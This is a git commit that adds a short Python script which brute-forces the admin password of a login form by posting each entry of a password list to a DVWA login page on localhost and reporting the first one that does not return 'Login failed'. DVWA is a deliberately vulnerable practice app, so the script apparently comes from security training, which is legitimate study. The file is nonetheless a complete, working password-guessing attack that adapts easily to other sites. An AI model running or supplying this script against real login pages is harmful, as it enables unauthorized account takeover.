b726bdf7ce8797aed1f85833d24e547e43f958df
RahimMahat <85168245+RahimMahat@users.noreply.github.com>
2021-07-10 11:15:16 +0530

    initial commit

---
+++ Z12_Guess_login.py
@@ -0,0 +1,35 @@
+#!/usr/bin/env python
+
+import requests
+
+
+target_url = "http://localhost/dvwa/login.php"
+data_dict = {'username':'admin','password':'','Login':'submit'}
+# 'username','password','Login' is name of username,password and submit input box in the html form
+
+with open("password.txt","r") as paswds:
+	for paswd in paswds:
+		pswd = paswd.strip()
+		data_dict["password"] = pswd
+		response = requests.post(target_url, data= data_dict)
+		if "Login failed" not in response.content:
+			print("[+] Got the password --> " + pswd)
+			exit()
+
+print("[-] Password is not in the given dictionary.")
+
+
+
+
+
+
+
+
+
+'''
+basic logic:
+target_url = "http://192.168.111.129/dvwa/login.php"
+data_dict = {'username':'admin','password':'password','Login':'submit'}
+response = requests.post(target_url, data= data_dict)
+print(response.content)
+'''
